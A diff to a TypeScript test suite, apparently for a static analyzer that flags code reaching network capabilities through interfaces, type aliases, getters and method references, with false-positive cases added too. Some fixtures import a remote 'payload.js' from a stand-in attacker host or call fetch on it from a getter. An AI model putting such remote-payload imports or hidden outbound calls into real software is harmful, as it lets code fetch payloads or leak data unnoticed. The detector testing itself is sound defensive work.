@@ -99,6 +99,18 @@ const caught: Record<string, string> = {
   en08_https_import: "import \"https://evil.example/payload.js\";\nexport const x = 1;",
   en09_dynamic_data_import: "export async function t() { return import(\"data:text/javascript,export default 1\"); }",
   en10_require_blob: "export function t() { return require(\"blob:nodedata:1234\"); }",
+  // Engine review (0.4): calls through interfaces that reached no implementation.
+  en11_fnprop_interface_class: "interface S { send: (u: string) => Promise<unknown> }\nclass Real implements S { send(u: string) { return fetch(u); } }\nexport function make(): S { return new Real(); }\nexport function t(s: S, u: string) { return s.send(u); }",
+  en12_fnprop_interface_literal: "interface S { send: (u: string) => Promise<unknown> }\nconst impl: S = { send: (u) => fetch(u) };\nexport function t(s: S = impl, u = \"\") { return s.send(u); }",
+  en13_type_alias_implements: "type S = { send(u: string): Promise<unknown> };\nclass Real implements S { send(u: string) { return fetch(u); } }\nexport function t(s: S, u: string) { return s.send(u); }",
+  en14_interface_extends_alias: "type Base = { send(u: string): Promise<unknown> };\ninterface S extends Base {}\nclass Real implements S { send(u: string) { return fetch(u); } }\nexport function t(s: S, u: string) { return s.send(u); }",
+  en15_structural_class: "interface S { send(u: string): Promise<unknown> }\nclass Real { send(u: string) { return fetch(u); } }\nexport function t(s: S, u: string) { return s.send(u); }",
+  en16_untyped_literal: "interface S { send(u: string): Promise<unknown> }\nconst impl = { send(u: string) { return fetch(u); } };\nexport function t(s: S = impl, u = \"\") { return s.send(u); }",
+  en17_method_reference_map: "interface S { send(u: string): Promise<unknown> }\nclass Real implements S { send(u: string) { return fetch(u); } }\nexport function t(s: S, us: string[]) { return Promise.all(us.map(s.send)); }",
+  en18_method_reference_call: "interface S { send(u: string): Promise<unknown> }\nclass Real implements S { send(u: string) { return fetch(u); } }\nexport function t(s: S, u: string) { return s.send.call(s, u); }",
+  en19_abstract_getter: "export abstract class B { abstract get url(): string; go() { return this.url; } }\nclass C extends B { get url() { void fetch(\"https://evil.example/\"); return \"\"; } }",
+  en20_interface_getter: "interface S { readonly url: string }\nclass C implements S { get url() { void fetch(\"https://evil.example/\"); return \"\"; } }\nexport function t(s: S) { return s.url; }",
+  en21_generic_alias: "type Repo<T> = { load(id: string): Promise<T> };\nclass Leads implements Repo<string> { async load(id: string) { return (await fetch(\"https://leads.example/\" + id)).text(); } }\nexport function t(r: Repo<string>, id: string) { return r.load(id); }",
 };
 
 // Harmless code that must not be reported, including common `any` casts that reach no capability.
@@ -124,6 +136,12 @@ const silent: Record<string, string> = {
   en_fp02_import_const_pure: "const spec = \"node:path\";\nexport async function t() { return (await import(spec)).join(\"a\", \"b\"); }",
   en_fp03_stylesheet: "import \"./missing-styles.css\";\nimport \"./missing-styles.css?inline\";\nexport const x = 1;",
   en_fp04_node_url: "export function t() { return new URL(\"data:text/plain,hello\").href; }",
+  // A class with a same-named member that can't stand in for the interface isn't an implementation.
+  // (All cases share one project, so these use member names no other case has.)
+  en_fp05_unrelated_same_name: "interface Pager { page(oncall: string): Promise<unknown> }\nclass Beeper { page(level: number) { return fetch(\"https://beeper.example/\" + level); } }\nexport function t(p: Pager, who: string) { return p.page(who); }\nexport const b = Beeper;",
+  // A call on one particular object reaches that object's method, not every look-alike.
+  en_fp07_object_method: "const relay = { forward(u: string) { return u.length; } };\nconst courier = { forward(u: string) { void fetch(u); return u.length; } };\nexport function t(u: string) { return relay.forward(u); }\nexport const c = courier;",
+  en_fp06_missing_members: "interface Uplink { transmit(u: string): void; hangUp(): void }\nconst partial = { transmit(u: string) { void fetch(u); } };\nexport function t(l: Uplink, u: string) { l.transmit(u); return partial; }",
 };
 
 const knownMisses: Record<string, { why: string; code: string }> = {
